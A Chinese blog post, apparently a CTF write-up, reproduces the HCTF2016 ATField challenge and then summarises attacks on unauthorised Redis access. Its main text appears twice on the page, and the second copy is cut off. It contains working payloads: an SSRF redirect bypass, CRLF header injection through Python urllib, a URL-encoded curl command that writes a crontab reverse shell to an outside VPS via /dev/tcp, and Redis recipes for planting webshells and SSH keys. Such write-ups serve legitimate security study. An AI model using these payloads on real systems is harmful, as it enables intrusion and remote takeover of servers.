@@ -1,0 +1,686 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./HCTF2016-ATfeild复现和对redis的利用的思考/font-awesome.min.css" rel="stylesheet"/>
+<link href="./HCTF2016-ATfeild复现和对redis的利用的思考/screen.css" rel="stylesheet"/>
+<link href="./HCTF2016-ATfeild复现和对redis的利用的思考/prism_okaidia.css" rel="stylesheet"/>
+<link href="./HCTF2016-ATfeild复现和对redis的利用的思考/bendawang.css" rel="stylesheet"/>
+<script src="./HCTF2016-ATfeild复现和对redis的利用的思考/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./HCTF2016-ATfeild复现和对redis的利用的思考/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./HCTF2016-ATfeild复现和对redis的利用的思考/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="hctf2016atfeildredis">HCTF2016-ATfeild复现和对redis的利用的思考</h1>
+<p style="max-width:100%;height:auto;">这次HCTF最后没有时间做ATFEILD了，挺遗憾的，所以赛后看了看题解，想了想还是复现下把。另外我也简单总结了几个redis的常用的利用方式。写的比较简单，要是有什么问题希望各位菊苣不吝赐教。。</p>
+<p style="max-width:100%;height:auto;">再另外千万不要用docker装centos7 。千万不要用docker装centos7 。千万不要用docker装centos7 。</p>
+<p style="max-width:100%;height:auto;">官方wp：http://lorexxar.cn/2016/11/29/hctf2016-ATField/</p>
+<h1 id="0x01hctf2016atfeild"><strong>0x01 HCTF2016 ATfeild 复现</strong></h1>
+<p style="max-width:100%;height:auto;">准备两个docker加上本机加上vps</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">|主机|ip|环境|
+|--|--|--|
+|本机|172.17.0.1|ubuntu 16.04|
+|vps |104.160.43.154| ubuntu 14.04|
+|docker 1|172.17.0.2| ubuntu 14.04 + python 2.7.6+ flask环境|
+|docker 2|172.17.0.4| centos7 + tcl8.6.1+redis 3.2.6+crontab|
+</code></pre>
+<p style="max-width:100%;height:auto;">其中docker 1即使是web服务器的角色，docker2即时与docker 1在同一内网的redis服务器。</p>
+<h2 id="11"><strong>1.1 环境搭建</strong></h2>
+<blockquote>
+<p style="max-width:100%;height:auto;">ps：万万不要用docker直接pull官方的centos7，存在bug，官方建议升级到7.2，不过个人建议用centos6比较好</p>
+</blockquote>
+<p style="max-width:100%;height:auto;">关于centos上搭建redis，除了常用的一些软件，其他的话我个人的话比较喜欢用源码编译，这样比较便于以后的一些操作什么的。给个链接，对照着装就行了</p>
+<p style="max-width:100%;height:auto;">http://www.centoscn.com/image-text/config/2014/0712/3285.html</p>
+<p style="max-width:100%;height:auto;">centos装crontab直接yum命令就可以了</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">yum install crontabs
+</code></pre>
+<p style="max-width:100%;height:auto;">ubuntu下flask的环境安装这里给个<code style="max-width:100%;height:auto;">.sh</code>文件把</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">sudo pip install flask                                                      
+sudo pip install flask-login                                                
+sudo pip install flask-openid                                               
+sudo pip install flask-mail                                                 
+sudo pip install flask-sqlalchemy                                           
+sudo pip install sqlalchemy-migrate                                         
+sudo pip install flask-whooshalchemy                                        
+sudo pip install flask-wtf                                                  
+sudo pip install flask-babel                                                
+sudo pip install flup
+</code></pre>
+<p style="max-width:100%;height:auto;">另外题目源码直接去github上dump下来就可以了。</p>
+<p style="max-width:100%;height:auto;">https://github.com/LoRexxar/hctf2016_atfield</p>
+<h2 id="12"><strong>1.2 搞事情</strong></h2>
+<p style="max-width:100%;height:auto;">环境搭好就可以搞事情了。</p>
+<p style="max-width:100%;height:auto;">首先访问下页面，发现可以输入url，那么第一想到多半就是SSRF了，试了试发现127.0.0.1被过滤了，用xip.io就可以绕过了。这都不是问题，略过。</p>
+<p style="max-width:100%;height:auto;">根据hint说是有nosql和crontab，那么我们尝试下常用的nosql，像是mongodb啊redis之类的常用端口，很容易就能发现172.17.0.4:6379存在redis服务。</p>
+<p style="max-width:100%;height:auto;">好的找到redis服务位置才开始我们的重头戏——<strong>通过python urllib header利用redis写crontab文件来反弹shell</strong></p>
+<h3 id="121pythonurllibredis"><strong>1.2.1 python urllib头注入 操作 redis</strong></h3>
+<p style="max-width:100%;height:auto;">当然该漏洞的前提python版本为<code style="max-width:100%;height:auto;">python3 &lt; 3.4.3 || python2 &lt; 2.7.9</code></p>
+<p style="max-width:100%;height:auto;">做题之前我们先测试下</p>
+<p style="max-width:100%;height:auto;">我们来看下面的代码：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">#!/usr/bin/env python                                                       
+# encoding: utf-8
+import sys
+import urllib2
+url = sys.argv[1]
+info = urllib2.urlopen(url)
+</code></pre>
+<p style="max-width:100%;height:auto;">然后保存在172.17.0.2的机器上开始测试，然后在172.17.0.4的机器上监听一下12345端口。</p>
+<p style="max-width:100%;height:auto;">然后执行<code style="max-width:100%;height:auto;">python a.py http://172.17.0.4:12345/</code></p>
+<p style="max-width:100%;height:auto;">这是在172.17.0.4上接收到这样的信息</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">GET / HTTP/1.1
+Accept-Encoding: identity
+Host: 172.17.0.4:12345
+Connection: close
+User-Agent: Python-urllib/2.7
+</code></pre>
+<p style="max-width:100%;height:auto;">然后我们执行这样的命令<code style="max-width:100%;height:auto;">python a.py http://172.17.0.4%0d%0aset%20a%2012345%0d%0a:12345/</code></p>
+<p style="max-width:100%;height:auto;">收到如下信息：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">GET / HTTP/1.1
+Accept-Encoding: identity
+Host: 172.17.0.4
+set a 12345
+:12345
+Connection: close
+User-Agent: Python-urllib/2.7
+</code></pre>
+<p style="max-width:100%;height:auto;">果然产生了http header的注入。</p>
+<p style="max-width:100%;height:auto;">如果我们将端口号改为redis服务的默认端口6379，那么就相当于把上面的信息直接发给redis，而redis会把上面的信息全部认为是命令，然后逐行执行，当时前几行肯定会出错，但是其中的</p>
+<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">set a 12345</code>肯定能够正常执行。</p>
+<p style="max-width:100%;height:auto;">执行<code style="max-width:100%;height:auto;">python a.py http://172.17.0.4%0d%0aset%20a%2012345%0d%0a:6379/</code></p>
+<p style="max-width:100%;height:auto;">发现已经成功往redis里面添加了一条记录。</p>
+<h3 id="122ssrf"><strong>1.2.2 ssrf 绕过与利用</strong></h3>
+<p style="max-width:100%;height:auto;">我们现在已知服务器会访问我们发送的link的链接，但是link的链接被一定程度上做了限制。</p>
+<p style="max-width:100%;height:auto;">这个时候经典的ssrf利用方式就是构造一个跳转。</p>
+<p style="max-width:100%;height:auto;">我们在vps上放一个<code style="max-width:100%;height:auto;">302.php</code>如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php  
+if(isset($_GET[&amp;apos;url&amp;apos;])){
+    $url= $_GET[&amp;apos;url&amp;apos;];
+    header("Location: $url");  
+}
+else{
+    echo &amp;apos;Location: $url&amp;apos;;
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后本机向服务器发送如下请求：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl -d "link=http://www.104.160.43.154.xip.io/302.php?url=XXXXXX" "http://172.17.0.2/show" -v -L
+</code></pre>
+<p style="max-width:100%;height:auto;">这样子我们就能肆意构造我们要访问的内网url，当服务器访问是会首先访问到我们vps上的<code style="max-width:100%;height:auto;">302.php</code>，然后跳转到我们构造的url上去。</p>
+<h3 id="123shell"><strong>1.2.3 构造反弹shell</strong></h3>
+<p style="max-width:100%;height:auto;">通过<code style="max-width:100%;height:auto;">1.2.2</code> 我们能够绕过过滤，在通过<code style="max-width:100%;height:auto;">1.2.1</code>我们能够构造payload写入信息redis，再加上提示说有<code style="max-width:100%;height:auto;">crontab</code>，这样我们就可以通过redis来写crontab文件然后反弹shell。</p>
+<p style="max-width:100%;height:auto;">正常我们在bash下反弹shell是这样子的命令</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">/bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1
+</code></pre>
+<p style="max-width:100%;height:auto;">写成计划任务形式，即crontab文件形式</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1
+</code></pre>
+<p style="max-width:100%;height:auto;">代表每分钟执行一次。具体写法google把。</p>
+<p style="max-width:100%;height:auto;">通常来说我们在使用redis写文件一半写法如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">set 11 "*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1"
+
+config set dir /var/spool/cron
+
+config set dbfilename root
+
+save
+</code></pre>
+<p style="max-width:100%;height:auto;">但是这里不能这样写，因为redis直接这样子，字符串中的空格在传输的时候事没有办法解决的，用单引号也没有办法写入。但是这个时候可以换一种写法</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">（1） set 11 "\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/104.160.43.154/12345 0&gt;&amp;1\n"
+
+（2）如下：
+
+------------------------------------------------------------------------------------------------------
+
+*3      //表示有三个参数
+$3     //下面这个参数长度为3
+set
+$1     //下面这个参数长度为1
+a       
+$64   //下面这个参数长度为64
+\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/104.160.43.154/12345 0&gt;&amp;1\n
+------------------------------------------------------------------------------------------------------
+</code></pre>
+<p style="max-width:100%;height:auto;">这里<code style="max-width:100%;height:auto;">\n</code>在传输的时候替换成%0a，所以我们要传入的明文子串如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">link=http://www.104.160.43.154.xip.io/302.php?url=http://172.17.0.4
+
+*3
+$3
+set
+$1
+a
+$64
+
+*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/104.160.43.154/12345 0&gt;&amp;1
+
+config set dir /var/spool/cron
+config set dbfilename root
+save
+:6379/
+</code></pre>
+<p style="max-width:100%;height:auto;">然后进行url编码，这里对换行符进行url是%0a，但是我们需要的是%0d%0a，所以编码时候要手动替换下</p>
+<p style="max-width:100%;height:auto;">编码后如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">link=http%3A%2f%2fwww.104.160.43.154.xip.io%2f302.php%3Furl%3Dhttp%253A%252f%252f172.17.0.4%25250d%25250A%25250d%25250A%25252a3%25250d%25250A%2525243%25250d%25250Aset%25250d%25250A%2525241%25250d%25250Aa%25250d%25250A%25252464%25250d%25250A%25250a%25252a%25252f1%252520%25252a%252520%25252a%252520%25252a%252520%25252a%252520%25252fbin%25252fbash%252520-i%252520%25253E%252526%252520%25252fdev%25252ftcp%25252f104.160.43.154%25252f12345%2525200%25253E%2525261%25250a%25250d%25250Aconfig%252520set%252520dir%252520%25252fvar%25252fspool%25252fcron%25250d%25250Aconfig%252520set%252520dbfilename%252520root%25250d%25250Asave%25250d%25250A%253A6379%252f
+</code></pre>
+<p style="max-width:100%;height:auto;">在vps上监听12345端口之后，然后执行如下命令</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl -d "link=http%3A%2f%2fwww.104.160.43.154.xip.io%2f302.php%3Furl%3Dhttp%253A%252f%252f172.17.0.4%25250d%25250A%25250d%25250A%25252a3%25250d%25250A%2525243%25250d%25250Aset%25250d%25250A%2525241%25250d%25250Aa%25250d%25250A%25252464%25250d%25250A%25250a%25252a%25252f1%252520%25252a%252520%25252a%252520%25252a%252520%25252a%252520%25252fbin%25252fbash%252520-i%252520%25253E%252526%252520%25252fdev%25252ftcp%25252f104.160.43.154%25252f12345%2525200%25253E%2525261%25250a%25250d%25250Aconfig%252520set%252520dir%252520%25252fvar%25252fspool%25252fcron%25250d%25250Aconfig%252520set%252520dbfilename%252520root%25250d%25250Asave%25250d%25250A%253A6379%252f" "http://172.17.0.2:8001/show" -v -L
+</code></pre>
+<p style="max-width:100%;height:auto;">观察redis服务器如下图所示：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">a已经写入了，再看<code style="max-width:100%;height:auto;">/var/spool/cron/root</code>文件</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">果然我们的命令已经被放在了单独的一行里面。</p>
+<p style="max-width:100%;height:auto;">这个时候vps上获得了shell如下图所示：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这道题就到此结束</p>
+<h1 id="0x02redis"><strong>0x02 关于redis未授权访问的利用方式</strong></h1>
+<p style="max-width:100%;height:auto;">首先在乌云知识库的<code style="max-width:100%;height:auto;">papers/3062</code>有比较详细的介绍，我这里也搜集了一下做了个简单的汇总。其实说到底redis利用还是写文件好用。</p>
+<p style="max-width:100%;height:auto;">首先redis的安全策略如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">1、每一行都要使用分隔符(CRLF)
+2、一条命令用”*”开始，同时用数字作为参数，需要分隔符(“*1”+ CRLF)
+3、我们有多个参数时：
+      字符：以”$”开头+字符的长度（＂$4＂+CRLF）+字符串(“TIME”+CRLF)
+      整数：以”:”开头+整数的ASCII码(“:42”+CRLF)
+</code></pre>
+<p style="max-width:100%;height:auto;">除了redis自带命令行有很多方式向redis输入命令，实际直接向6379端口发送命令就可以了。</p>
+<p style="max-width:100%;height:auto;">如：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">redis-cli set bendawang &amp;apos;Bendawang&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">等价的如：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">echo -e  &amp;apos;*3\r\n$3\r\nSET\r\n$9\r\nbendawang\r\n$9\r\nBendawang\r\n&amp;apos; | nc 127.0.0.1 6379
+</code></pre>
+<p style="max-width:100%;height:auto;">再如：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">echo -e  &amp;apos;Bendawang&amp;apos; | redis-cli -x set bendawang
+</code></pre>
+<p style="max-width:100%;height:auto;">当然如果是远程的，就将<code style="max-width:100%;height:auto;">redis-cli</code>换成<code style="max-width:100%;height:auto;">redis-cli -h host -p port</code>即可。</p>
+<h3 id="21"><strong>2.1 爆破键值</strong></h3>
+<p style="max-width:100%;height:auto;">这个就不多说了，直接上字典爆破什么的。。。</p>
+<h3 id="22eval"><strong>2.2 eval执行命令</strong></h3>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">redis-cli EVAL "dofile(&amp;apos;/etc/hosts&amp;apos;)" 0 -h 172.17.0.4
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">能获取到部分鸡肋信息把。</p>
+<p style="max-width:100%;height:auto;">然后也可以执行lua命令，但是我们一把来说不会对redis数据库内部的东西感兴趣，如果感兴趣直接randomkey看就可以了。</p>
+<p style="max-width:100%;height:auto;">当然也可以利用服务器的<code style="max-width:100%;height:auto;">redis.sha1hex()</code>在他的机器上暴力跑sha-1。</p>
+<p style="max-width:100%;height:auto;">不过我们有更好的利用方式。这里也就不多说了。</p>
+<h3 id="23webshell"><strong>2.3 写webshell</strong></h3>
+<p style="max-width:100%;height:auto;">网上查到p神发的文章</p>
+<p style="max-width:100%;height:auto;">https://www.secpulse.com/archives/5357.html</p>
+<p style="max-width:100%;height:auto;">这里需要注意的是，如果是在<code style="max-width:100%;height:auto;">ubuntu</code>系统下，全版本的系统写出来的文件都是<code style="max-width:100%;height:auto;">660</code>的权限，即通过web服务器事没有办法访问的</p>
+<p style="max-width:100%;height:auto;">但是<code style="max-width:100%;height:auto;">centos6</code>和<code style="max-width:100%;height:auto;">centos7</code>写出来的权限是<code style="max-width:100%;height:auto;">644</code>，即服务器可以访问，可以写webshell。</p>
+<p style="max-width:100%;height:auto;">另外注意是找那些猜想是777权限的目录写webshell，不然权限问题写不了。</p>
+<p style="max-width:100%;height:auto;">如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">config set dir /var/www/html/       //这里需要服务器绝对路径，可以根据服务器类型判断然后猜测常用的路径
+
+config set dbfilename bdw.php
+
+set a "&lt;?php phpinfo();?&gt;"
+
+sava    //也可以bgsave
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">如下所示：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./HCTF2016-ATfeild复现和对redis的利用的思考/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<h3 id="24crontabshell"><strong>2.4 写入crontab反弹shell</strong></h3>
+<p style="max-width:100%;height:auto;">之前介绍了，这里不多说了</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">redis-cli flushall    
+
+echo -e "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口 0&gt;&amp;1\n\n" | redis-cli -x set 1     
+
+redis-cli config set dir /var/spool/cron/     
+
+redis-cli config set dbfilename root     
+
+redis-cli save
+</code></pre>
+<h3 id="25sshkey"><strong>2.5 配合写ssh key，免密登陆</strong></h3>
+<p style="max-width:100%;height:auto;">这个的概率应该比较小吧。。</p>
+<p style="max-width:100%;height:auto;">原理是一样的</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">config set dir /root/.ssh/
+config set dbfilename authorized_keys
+set xxxx "这里写你的id_rsa.pub的值"
+
+save
+</code></pre>
+<p style="max-width:100%;height:auto;">然后直接通过ssh连上去就行了。</p>
+<p style="max-width:100%;height:auto;">估计基本上在第一句就会遭遇权限问题吧。。。毕竟/root一般都是<code style="max-width:100%;height:auto;">700</code>或是<code style="max-width:100%;height:auto;">740</code>或是<code style="max-width:100%;height:auto;">750</code>吧。</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./HCTF2016-ATfeild复现和对redis的利用的思考/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="hctf2016atfeildredis">HCTF2016-ATfeild复现和对redis的利用的思考</h1>
+<p style="max-width:100%;height:auto;">这次HCTF最后没有时间做ATFEILD了，挺遗憾的，所以赛后看了看题解，想了想还是复现下把。另外我也简单总结了几个redis的常用的利用方式。写的比较简单，要是有什么问题希望各位菊苣不吝赐教。。</p>
+<p style="max-width:100%;height:auto;">再另外千万不要用docker装centos7 。千万不要用docker装centos7 。千万不要用docker装centos7 。</p>
+<p style="max-width:100%;height:auto;">官方wp：http://lorexxar.cn/2016/11/29/hctf2016-ATField/</p>
+<h1 id="0x01hctf2016atfeild"><strong>0x01 HCTF2016 ATfeild 复现</strong></h1>
+<p style="max-width:100%;height:auto;">准备两个docker加上本机加上vps</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">|主机|ip|环境|
+|--|--|--|
+|本机|172.17.0.1|ubuntu 16.04|
+|vps |104.160.43.154| ubuntu 14.04|
+|docker 1|172.17.0.2| ubuntu 14.04 + python 2.7.6+ flask环境|
+|docker 2|172.17.0.4| centos7 + tcl8.6.1+redis 3.2.6+crontab|
+</code></pre>
+<p style="max-width:100%;height:auto;">其中docker 1即使是web服务器的角色，docker2即时与docker 1在同一内网的redis服务器。</p>
+<h2 id="11"><strong>1.1 环境搭建</strong></h2>
+<blockquote>
+<p style="max-width:100%;height:auto;">ps：万万不要用docker直接pull官方的centos7，存在bug，官方建议升级到7.2，不过个人建议用centos6比较好</p>
+</blockquote>
+<p style="max-width:100%;height:auto;">关于centos上搭建redis，除了常用的一些软件，其他的话我个人的话比较喜欢用源码编译，这样比较便于以后的一些操作什么的。给个链接，对照着装就行了</p>
+<p style="max-width:100%;height:auto;">http://www.centoscn.com/image-text/config/2014/0712/3285.html</p>
+<p style="max-width:100%;height:auto;">centos装crontab直接yum命令就可以了</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">yum install crontabs
+</code></pre>
+<p style="max-width:100%;height:auto;">ubuntu下flask的环境安装这里给个<code style="max-width:100%;height:auto;">.sh</code>文件把</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">sudo pip install flask                                                      
+sudo pip install flask-login                                                
+sudo pip install flask-openid                                               
+sudo pip install flask-mail                                                 
+sudo pip install flask-sqlalchemy                                           
+sudo pip install sqlalchemy-migrate                                         
+sudo pip install flask-whooshalchemy                                        
+sudo pip install flask-wtf                                                  
+sudo pip install flask-babel                                                
+sudo pip install flup
+</code></pre>
+<p style="max-width:100%;height:auto;">另外题目源码直接去github上dump下来就可以了。</p>
+<p style="max-width:100%;height:auto;">https://github.com/LoRexxar/hctf2016_atfield</p>
+<h2 id="12"><strong>1.2 搞事情</strong></h2>
+<p style="max-width:100%;height:auto;">环境搭好就可以搞事情了。</p>
+<p style="max-width:100%;height:auto;">首先访问下页面，发现可以输入url，那么第一想到多半就是SSRF了，试了试发现127.0.0.1被过滤了，用xip.io就可以绕过了。这都不是问题，略过。</p>
+<p style="max-width:100%;height:auto;">根据hint说是有nosql和crontab，那么我们尝试下常用的nosql，像是mongodb啊redis之类的常用端口，很容易就能发现172.17.0.4:6379存在redis服务。</p>
+<p style="max-width:100%;height:auto;">好的找到redis服务位置才开始我们的重头戏——<strong>通过python urllib header利用redis写crontab文件来反弹shell</strong></p>
+<h3 id="121pythonurllibredis"><strong>1.2.1 python urllib头注入 操作 redis</strong></h3>
+<p style="max-width:100%;height:auto;">当然该漏洞的前提python版本为<code style="max-width:100%;height:auto;">python3 &lt; 3.4.3 || python2 &lt; 2.7.9</code></p>
+<p style="max-width:100%;height:auto;">做题之前我们先测试下</p>
+<p style="max-width:100%;height:auto;">我们来看下面的代码：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">#!/usr/bin/env python                                                       
+# encoding: utf-8
+import sys
+import urllib2
+url = sys.argv[1]
+info = urllib2.urlopen(url)
+</code></pre>
+<p style="max-width:100%;height:auto;">然后保存在172.17.0.2的机器上开始测试，然后在172.17.0.4的机器上监听一下12345端口。</p>
+<p style="max-width:100%;height:auto;">然后执行<code style="max-width:100%;height:auto;">python a.py http://172.17.0.4:12345/</code></p>
+<p style="max-width:100%;height:auto;">这是在172.17.0.4上接收到这样的信息</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">GET / HTTP/1.1
+Accept-Encoding: identity
+Host: 172.17.0.4:12345
+Connection: close
+User-Agent: Python-urllib/2.7
+</code></pre>
+<p style="max-width:100%;height:auto;">然后我们执行这样的命令<code style="max-width:100%;height:auto;">python a.py http://172.17.0.4%0d%0aset%20a%2012345%0d%0a:12345/</code></p>
+<p style="max-width:100%;height:auto;">收到如下信息：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">GET / HTTP/1.1
+Accept-Encoding: identity
+Host: 172.17.0.4
+set a 12345
+:12345
+Connection: close
+User-Agent: Python-urllib/2.7
+</code></pre>
+<p style="max-width:100%;height:auto;">果然产生了http header的注入。</p>
+<p style="max-width:100%;height:auto;">如果我们将端口号改为redis服务的默认端口6379，那么就相当于把上面的信息直接发给redis，而redis会把上面的信息全部认为是命令，然后逐行执行，当时前几行肯定会出错，但是其中的</p>
+<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">set a 12345</code>肯定能够正常执行。</p>
+<p style="max-width:100%;height:auto;">执行<code style="max-width:100%;height:auto;">python a.py http://172.17.0.4%0d%0aset%20a%2012345%0d%0a:6379/</code></p>
+<p style="max-width:100%;height:auto;">发现已经成功往redis里面添加了一条记录。</p>
+<h3 id="122ssrf"><strong>1.2.2 ssrf 绕过与利用</strong></h3>
+<p style="max-width:100%;height:auto;">我们现在已知服务器会访问我们发送的link的链接，但是link的链接被一定程度上做了限制。</p>
+<p style="max-width:100%;height:auto;">这个时候经典的ssrf利用方式就是构造一个跳转。</p>
+<p style="max-width:100%;height:auto;">我们在vps上放一个<code style="max-width:100%;height:auto;">302.php</code>如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php  
+if(isset($_GET[&amp;apos;url&amp;apos;])){
+    $url= $_GET[&amp;apos;url&amp;apos;];
+    header("Location: $url");  
+}
+else{
+    echo &amp;apos;Location: $url&amp;apos;;
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后本机向服务器发送如下请求：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl -d "link=http://www.104.160.43.154.xip.io/302.php?url=XXXXXX" "http://172.17.0.2/show" -v -L
+</code></pre>
+<p style="max-width:100%;height:auto;">这样子我们就能肆意构造我们要访问的内网url，当服务器访问是会首先访问到我们vps上的<code style="max-width:100%;height:auto;">302.php</code>，然后跳转到我们构造的url上去。</p>
+<h3 id="123shell"><strong>1.2.3 构造反弹shell</strong></h3>
+<p style="max-width:100%;height:auto;">通过<code style="max-width:100%;height:auto;">1.2.2</code> 我们能够绕过过滤，在通过<code style="max-width:100%;height:auto;">1.2.1</code>我们能够构造payload写入信息redis，再加上提示说有<code style="max-width:100%;height:auto;">crontab</code>，这样我们就可以通过redis来写crontab文件然后反弹shell。</p>
